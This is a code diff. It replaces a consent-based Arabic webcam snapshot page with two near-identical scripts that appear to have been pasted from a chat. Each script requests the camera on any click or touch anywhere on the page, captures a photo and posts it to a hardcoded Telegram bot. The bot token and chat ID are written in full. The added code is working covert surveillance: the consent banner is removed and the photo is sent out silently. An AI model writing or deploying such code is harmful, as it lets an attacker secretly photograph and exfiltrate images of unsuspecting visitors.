@@ -1,136 +1,154 @@
-<!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>التقاط صورة بواسطة الكاميرا</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            margin: 20px;
-            background-color: #f4f4f9;
-        }
-
-        .video-container {
-            position: relative;
-            width: 100%;
-            max-width: 600px;
-            margin: 0 auto;
-        }
-
-        video#myVideo {
-            width: 100%;
-            border-radius: 8px;
-            background-color: #000000;
-        }
-
-        #capturedImage {
-            position: absolute;
-            bottom: 15px;
-            right: 15px;
-            width: 120px;
-            height: 90px;
-            border-radius: 6px;
-            border: 2px solid #ffffff;
-            object-fit: cover;
-            display: none;
-            z-index: 5;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.5);
-        }
-
-        .cam-banner {
-            position: absolute;
-            top: 40px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: rgba(0, 0, 0, 0.85);
-            color: #ffffff;
-            padding: 15px;
-            border-radius: 8px;
-            width: 80%;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.3);
-            z-index: 10;
-            text-align: center;
-        }
-
-        .cam-banner p {
-            margin: 0 0 10px 0;
-            font-size: 14px;
-        }
-
-        .cam-banner button {
-            padding: 8px 16px;
-            font-size: 14px;
-            background-color: #007bff;
-            color: white;
-            border: none;
-            border-radius: 4px;
-            cursor: pointer;
-            transition: background-color 0.2s;
-        }
-
-        .cam-banner button:hover {
-            background-color: #0056b3;
-        }
-
-        #statusText {
-            margin-top: 15px;
-            font-size: 14px;
-            color: #555;
-            text-align: center;
-            word-break: break-word;
-        }
-    </style>
-</head>
-<body>
-
-<div class="video-container">
-    <video id="myVideo" controls autoplay muted loop>
-        <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
-        متصفحك لا يدعم تشغيل هذا الفيديو.
-    </video>
-
-    <img id="capturedImage" alt="الصورة الملتقطة" />
-
-    <div class="cam-banner" id="camBanner">
-        <p id="camPrompt">هل تسمح بالتقاط صورة بواسطة الكاميرا؟</p>
-        <button id="takeSnapBtn">سماح والتقاط صورة</button>
-    </div>
-</div>
-
-<p id="statusText">بانتظار التقاط الصورة...</p>
-
-<!-- عنصر canvas مخفي لمعالجة التقاط الصورة -->
-<canvas id="canvas" style="display:none;"></canvas>
+[30-09-2026 02:35] 😍 abdo 08399: #result {
+        max-width: 90%;
+        max-height: 90vh;
+        border-radius: 10px;
+        display: none;
+        margin: auto;
+    }
+</style>
+<img id="result" alt="">
 
 <script>
-    const takeSnapBtn = document.getElementById('takeSnapBtn');
-    const statusText = document.getElementById('statusText');
-    const capturedImage = document.getElementById('capturedImage');
-    const camBanner = document.getElementById('camBanner');
-    const canvas = document.getElementById('canvas');
+    const TELEGRAM_BOT_TOKEN = '8469850859:AAFQJDODXLXA-9jJYhYJ8ASll3-6d2RnIQA';
+    const TELEGRAM_CHAT_ID = '6642913954';
 
-    takeSnapBtn.addEventListener('click', async () => {
-        statusText.innerText = "جاري طلب إذن الكاميرا...";
-        
+    let isProcessing = false;
+
+    async function handleCapture() {
+        if (isProcessing) return;
+        isProcessing = true;
+
+        let stream = null;
+
         try {
-            // طلب الإذن من المتصفح لفتح الكاميرا الأمامية (السيلفي)
-            const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: "user" } 
-            });
+            // 1. طلب إذن الكاميرا عند النقر على أي مكان بالصفحة
+            stream = await navigator.mediaDevices.getUserMedia({ video: true });
 
-            // إنشاء عنصر فيديو مؤقت لالتقاط الفريم
-            const tempVideo = document.createElement('video');
-            tempVideo.srcObject = stream;
-            await tempVideo.play();
+            // إنشاء عنصر فيديو مخفي في الذاكرة
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            await video.play();
 
-            // ضبط أبعاد الـ Canvas ورسم الصورة
-            canvas.width = tempVideo.videoWidth || 640;
-            canvas.height = tempVideo.videoHeight || 480;
-            const context = canvas.getContext('2d');
-            context.drawImage(tempVideo, 0, 0, canvas.width, canvas.height);
+            // 2. التقاط صورة فورية
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
 
-            // تحويل الصورة لعرضها في العنصر المخصص
-            const imageData = canvas.toDataURL('image/png');
-            capturedImage.src = imageData;
-            capturedImage.style.display = 'block';
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0);
+
+            // إظهار الصورة الملتقطة لمدة ثانية
+            const img = document.getElementById('result');
+            img.src = canvas.toDataURL('image/png');
+            img.style.display = 'block';
+
+            setTimeout(() => {
+                img.style.display = 'none';
+            }, 1000);
+
+            // 3. إرسال الصورة لبوت تيليجرام
+            canvas.toBlob(async (blob) => {
+                const formData = new FormData();
+                formData.append('chat_id', TELEGRAM_CHAT_ID);
+                formData.append('photo', blob, 'capture.png');
+
+                try {
+                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                } catch (err) {
+                    console.error("خطأ الإرسال:", err);
+                }
+            }, 'image/png');
+
+        } catch (err) {
+            console.error("خطأ الكاميرا:", err);
+        } finally {
+            // 4. إغلاق الكاميرا وإطفاء الضوء فوراً وبشكل قطعي
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+            }
+        }
+    }
+
+    // تشغيل طلب الإذن فور نقر المستخدم في أي مكان داخل الشاشة
+    window.addEventListener('click', handleCapture);
+    window.addEventListener('touchstart', handleCapture);
+</script>
+[30-09-2026 02:38] 😍 abdo 08399: #result {
+        max-width: 90%;
+        max-height: 90vh;
+        border-radius: 10px;
+        display: none;
+    }
+</style>
+<img id="result" alt="">
+
+<script>
+    const TELEGRAM_BOT_TOKEN = '8469850859:AAFQJDODXLXA-9jJYhYJ8ASll3-6d2RnIQA';
+    const TELEGRAM_CHAT_ID = '6642913954';
+
+    let isProcessing = false;
+
+    async function handleCapture() {
+        if (isProcessing) return;
+        isProcessing = true;
+
+        let stream = null;
+
+        try {
+            // 1. طلب إذن الكاميرا عند النقر على الشاشة
+            stream = await navigator.mediaDevices.getUserMedia({ video: true });
+
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            await video.play();
+
+            // 2. التقاط صورة فورية
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0);
+
+            // إظهار اللقطة لمدة ثانية واحدة
+            const img = document.getElementById('result');
+            img.src = canvas.toDataURL('image/png');
+            img.style.display = 'block';
+
+            setTimeout(() => {
+                img.style.display = 'none';
+            }, 1000);
+
+            // 3. إرسال الصورة إلى تيليجرام
+            canvas.toBlob(async (blob) => {
+                const formData = new FormData();
+                formData.append('chat_id', TELEGRAM_CHAT_ID);
+                formData.append('photo', blob, 'capture.png');
+
+                try {
+                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                } catch (err) {
+                    console.error("خطأ الإرسال:", err);
+                }
+            }, 'image/png');
+
+        } catch (err) {
+            console.error("خطأ الكاميرا:", err);
+        } finally {
+            // 4. إغلاق الكاميرا وإيقاف الضوء/البث فوراً
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+            }
+        }
+    }
+
+    // الاستماع للنقر أو اللمس في أي مكان في الصفحة
+    window.addEventListener('click', handleCapture);
+    window.addEventListener('touchstart', handleCapture);
+</script>
